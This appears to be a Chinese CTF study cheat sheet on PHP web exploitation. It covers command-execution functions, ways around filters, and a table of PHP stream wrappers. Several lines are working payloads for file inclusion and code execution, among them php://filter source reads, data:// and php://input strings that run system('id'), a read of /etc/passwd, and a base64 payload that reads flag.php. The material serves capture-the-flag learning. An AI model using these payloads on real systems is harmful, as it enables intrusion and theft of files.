>PHP官网:https://www.php.net/    查看各类函数

//怎么访问根目录下的  rot13base.php


访问 [rot13base.php](./rot13base.php)

# 命令执行,函数

PHP 核心：var_dump、include、file_get_contents、system、eval、phpinfo
Linux 核心：cat、ls、find、id、pwd

输出/打印
```
var_dump($var);       // 最常用：输出变量类型+值+长度，调试神器
print_r($var);        // 打印数组/对象结构
echo $var;            // 直接输出字符串
var_export($var);     // 输出可执行的PHP代码
printf($fmt, $var);   // 格式化输出（绕过过滤常用）
```

文件读取/包含类(伪协议搭配)
```
include $_GET['file'];// 文件包含漏洞本体
require $_GET['file'];
include_once; require_once;

file_get_contents($f);// 读文件内容（读源码/flag）
file_put_contents($f,$d);// 写文件（写马）
readfile($f);         // 直接输出文件内容（无回显绕过神器）
fopen(); fread();     // **文件指针读写**
```

命令执行
```
system('id');         // 执行命令+直接输出结果
exec('id');           // 执行命令，只返回最后一行
shell_exec('id');     // 反引号 `id` 等价，返回全部结果
passthru('id');       // 执行命令+输出二进制流
popen('id', 'r');     // 打开进程管道
```
信息获取查
```
phpinfo();            // 调试pyload是否可用。看PHP配置、禁用函数、路径、版本（必用）
ini_get('xxx');       // 获取php.ini配置
getcwd();             // 当前工作路径
scandir('./');        // 列出目录文件
dirname(__FILE__);    // 取文件目录
```
编码解码
```
base64_encode(); base64_decode();
urldecode(); urlencode();
str_rot13();          // 绕过关键字过滤
eval();               // *常用  执行PHP代码（一句话木马核心）
assert();             // 断言=执行代码（绕过disable_functions常用）
```

其他
```
ini_set('display_errors',1); // 开启报错
error_reporting(E_ALL);      // 显示所有错误
md5(); sha1();        // 哈希
isset(); empty();     // 判断变量
```
Linux系统命令
```
whoami          // 查看当前用户 * 常用 
ls              // 列出目录内容 * 常用 
pwd             // 显示当前工作目录 * 常用 
cat             // 查看文件内容
echo            // 输出字符串 * 常用 
mkdir           // 创建目录
rm              // 删除文件或目录
cp              // 复制文件或目录
mv              // 移动或重命名文件或目录 * 常用 
cat flag.php    // 读文件
tac flag.php    // 倒着读（绕过cat过滤） * 常用 
more flag       // 分页读
less flag       // 分页读
head flag       // 读前10行
tail flag       // 读后10行
nl flag         // 带行号读
od -c flag      // 二进制读
```
通配符  转义
```
*   匹配任意字符（除换行符外）
?   匹配单个字符 (常用于占位)
[]  匹配括号内的任意一个字符
[^] 匹配不在括号内的任意一个字符
\   转义特殊字符
```

符号|含义|URL
---|----|----
\ n |换行|%0A
\ r |回车|%0D
\ t |水平制表符|%09
\ ; |分号|%3B
\ =|等于号|%3D
\ #|#号|%23
\  |空格|%20
\ ?|问号|%3F
\ | 右斜杠| %2F













## 0x1: preg_match()函数 
执行一个正则表达式匹配.***经常与if搭配用于过滤***
```
格式：int preg_match ( string $pattern , mixed $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] )


preg_match($pattern, $subject, $matches);

String $pattern 正则表达式模式 (pattern='/      /')
String $subject 要匹配的字符串
String $matches 如果提供了matches,它将被填充为搜索到的匹配项

```
## 0x2: require和include

require和include都是PHP中的文件包含函数，用于在脚本中包含和执行指定文件的内容。
二者区别在于处理错误的方式不同

1.require语句在执行时会检查文件是否存在，如果文件不存在则会生成一个致命错误（E_COMPILE_ERROR），**并停止脚本执行**

`require 'filename.php';`

2.include语句在执行时会检查文件是否存在，如果文件不存在则会生成一个警告（E_WARNING），**但脚本会继续执行**

`include 'filename.php';`

## 0x3: system()函数

执行一个外部程序

```

格式：int system ( string $command )



system($command);



String $command 要执行的命令

```

不需要使用括号的函数
```
echo
print
isset
include
reuqire
```

## 0x4: file_get_contents()函数

读取文件内容

```

格式：string file_get_contents ( string $filename [, bool $use_include_path = FALSE [, resource $context [, int $offset = 0 [, int $maxlen ]]]] )

file_get_contents($filename);

String $filename 文件路径
bool $use_include_path 是否使用 include_path 搜索
resource $context 流上下文
int $offset 起始偏移量
int $maxlen 最大长度

```

## 0x5: 伪协议
PHP 伪协议（又称流包装器）是 PHP 内建的资源访问机制，以`协议://资源`的 URL 格式，让`include、file_get_contents`等函数统一操作本地文件、远程资源、内存流、压缩包等不同数据源。**CTF 与代码审计中，它是文件包含、代码执行、源码泄露的核心利用手段。**


|协议| 核心能力 | 关键条件 / 限制 |	典型利用示例  |
|----| ---- | ---- | ---- |
|php://filter|读取 / 处理文件源码（Base64 编码绕过执行）|	无需开启远程配置|	?file=php://filter/read=convert.base64-encode/resource=index.php|
|php://input|读取 POST 原始数据，配合包含执行代码|需allow_url_include=On；不支持multipart/form-data	|URL：?file=php://inputPOST：<?php system('id');?>|
|data://	|内联数据直接执行（URL 嵌入代码）|	需allow_url_include=On（PHP≥5.2.0）|	?file=data://text/plain,<?php system('id');?>|
|file://	|访问本地文件系统（绝对 / 相对路径）|	不受远程配置限制（双 OFF 可用）|	?file=file:///etc/passwd（Linux）/ file://C:/windows/system.ini（Windows）
|zip:///phar://	|读取压缩包内文件（绕过后缀限制 / WAF）	压缩包为 ZIP 格式；|phar://需phar.readonly=Off|	zip:///tmp/shell.zip%23shell.php（%23为#URL 编码）|

### data://text/plain
`data://text/plain,base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+`
base64->`<?php system("tac flag.php")?>`-->`data://text/plain,<?php system("tac flag.php")?>`

















